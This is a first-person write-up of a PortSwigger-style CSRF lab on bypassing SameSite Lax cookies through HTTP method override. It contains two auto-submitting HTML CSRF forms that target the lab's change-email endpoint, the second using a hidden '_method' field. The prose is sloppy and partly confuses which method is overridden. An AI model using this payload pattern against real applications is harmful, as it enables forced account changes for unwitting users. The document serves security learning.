## Detailed Writeup of Csrf Practitioner Lab(**SameSite Lax bypass via method override**)

Date:- 18 January 2026 
Level:- Practitioner

Here,i am doing the lab of Method Overriding inn which i am given with the credentials given below are:-

#Username:-wiener

#Password:-peter

I just enter the credials and login as a user using the following credentials,theni saw a email updater so i enter the test email capture the request at **Burp Suite** and send the requerst to repeater.

When i saw the request i does not contain any **csrf token** therefore it is clearly vunerable so i created a **html feild** and store on **exploit server** provided on the website.

When i check it is showing **method not allowed** then i changed the request from **POST** to **GET** using method overriding as the both code is given below.

#Initial Code

<html>
  <body>
    <form action="https://0a42001404c9b77380c4442f0019001a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tt&#64;gm&#46;in" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

#Modified Code

<html>
  <body>
    <form action="https://0a42001404c9b77380c4442f0019001a.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="tt&#64;gm&#46;in" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

Here,i included one extra line ` <input type="hidden" name="_method" value="POST"> ` in which override the method request from **POST** to **GET**.

I simply send the modified code to **Exploit server** by changing the email id and Boom! i just solved the lab.

**Key-Learning**:-Lax can be bypassed if an application allows HTTP method override. 



